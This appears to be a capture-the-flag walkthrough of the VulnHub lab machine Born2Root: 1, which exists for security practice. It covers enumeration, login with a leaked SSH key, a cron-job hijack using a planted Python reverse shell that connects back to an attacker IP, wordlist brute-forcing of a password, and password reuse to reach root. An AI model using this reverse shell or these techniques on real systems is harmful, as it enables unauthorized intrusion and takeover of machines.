# Born2Root: 1

## 1.Get VM IP

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3d1116fe-6019-4783-8339-8fbc26286343)

The IP address is `192.168.56.109`, let's enumerate it.

## 2.Enumeration

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/85cd869d-e904-4ad6-b19b-ec9b4fc7ade4)

So, let's check the webpage first :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/59336175-e076-4ad0-be39-cc47c08d9d88)

there afew usernames here : 

- martin
- hadi
- jimmy

write them down and try to fuzz the web application :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ffdfd581-84fc-4476-8bc8-925293af35eb)

we found several directories, first go to `/icons` and there are a lot of files here :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2501949e-23dc-4baa-888c-6ee000056202)

## 3.Gaining Shell

Check the file named `VDSoyuAXiO.txt` and you see a SSH private key here :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5fc3cea2-3a53-49fe-91eb-95976e128380)

we can now check which user does this private key belongs to, i try user `martin` :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/726b9871-be30-4f9e-ac46-ab00b27ca1a4)

and for secret password just use a blank password.

## 4.Privilege Escalation 1 (Jimmy)

Check crontab :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/83620935-2f64-4113-9402-c0c9016a627d)

the file `sekurity.py` has jimmy permissions and there are no `sekurity.py` in `/tmp` so we need to create one

and put a reverse shell in it :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/57fb2b39-c6cc-4e35-b08f-bcdce6e93eac)

## 5.Privilege Escalation 2 (hadi)

If you see the home page of user jimmy, there is a file called `networker` and when execurting it :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a01a92d0-0cdf-4713-a188-6a77a97788f8)

this binary is a rabbit hole and has nothing to do with, since we logged in as 2 users out of 3 possible users

now the only option is to brute force the last user password, user `hadi`, we can generate a new wordlist or use `rockyou.txt` :

```bash
root@kali: cat /usr/share/wordlists/rockyou.txt | grep hadi > hadi.txt
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f536fb33-3d0d-42f7-bbcc-57c4d435085f)


now we can log in with password `hadi123`, again in home directory we see binaries that has nothing to do with

they are just rabbit holes, so annoying ...

## Privilege Escalation 3 (root)

Just reuse the password to get root :

```bash
hadi@debian:~$ su root
su root
Mot de passe : hadi123

root@debian:/home/hadi# cd /root
cd /root
root@debian:~# cat flag.txt
cat flag.txt
                                                                      
,-----.                         ,---. ,------.                 ,--.   
|  |) /_  ,---. ,--.--.,--,--, '.-.  \|  .--. ' ,---.  ,---. ,-'  '-. 
|  .-.  \| .-. ||  .--'|      \ .-' .'|  '--'.'| .-. || .-. |'-.  .-' 
|  '--' /' '-' '|  |   |  ||  |/   '-.|  |\  \ ' '-' '' '-' '  |  |   
`------'  `---' `--'   `--''--''-----'`--' '--' `---'  `---'   `--'   


Congratulations ! you  pwned completly Born2root's CTF .

I hope you enjoyed it and you have made Tea's overdose or coffee's overdose :p 

I have blocked some easy ways to complete the CTF ( Kernel Exploit ... ) for give you more fun and more knownledge ...

Pwning the box with a linux binary misconfiguration is more fun than with a Kernel Exploit !

Enumeration is The Key .



Give me feedback :[FB] Hadi Mene
```

this is how you can get root on this machine :)









